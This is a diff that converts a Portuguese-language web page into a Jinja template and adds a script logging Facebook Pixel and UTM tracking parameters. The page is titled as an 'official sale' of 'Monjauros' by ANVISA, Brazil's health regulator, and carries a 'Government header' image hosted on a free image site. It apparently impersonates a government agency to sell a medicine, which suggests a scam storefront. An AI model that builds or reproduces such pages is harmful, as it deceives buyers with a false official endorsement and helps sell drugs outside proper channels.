@@ -1,13 +1,42 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>ANVISA | Venda Oficial do Monjauros</title>
-  
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+{% extends "base.html" %}
 
+{% block title %}ANVISA | Venda Oficial do Monjauros{% endblock %}
+
+{% block head_scripts %}
+  <!-- Log da página no console do navegador para debug -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('[Facebook Pixel] Página /anvisa carregada - evento PageView sendo registrado');
+      
+      // Verificar UTMs disponíveis
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = {};
+      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'fbclid'].forEach(param => {
+        if (urlParams.has(param)) {
+          utmParams[param] = urlParams.get(param);
+        }
+      });
+      
+      if (Object.keys(utmParams).length > 0) {
+        console.log('[Facebook Pixel] UTM params detectados na URL:', utmParams);
+      } else {
+        console.log('[Facebook Pixel] Nenhum UTM param detectado na URL');
+        
+        // Verificar se temos UTMs armazenados
+        try {
+          const storedParams = localStorage.getItem('utm_params');
+          if (storedParams) {
+            console.log('[Facebook Pixel] UTM params encontrados no localStorage:', JSON.parse(storedParams));
+          }
+        } catch (e) {
+          console.error('[Facebook Pixel] Erro ao ler UTMs do localStorage:', e);
+        }
+      }
+    });
+  </script>
+{% endblock %}
+
+{% block additional_styles %}
   <style>
     @font-face {
       font-family: 'Rawline';
@@ -116,8 +145,11 @@
       display: inline-block;
     }
   </style>
-</head>
-<body class="bg-white">
+{% endblock %}
+
+{% block content %}
+
+
   <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
   <div class="sticky-header">
     <div class="container mx-auto px-4 border-b border-[#0000001a]">
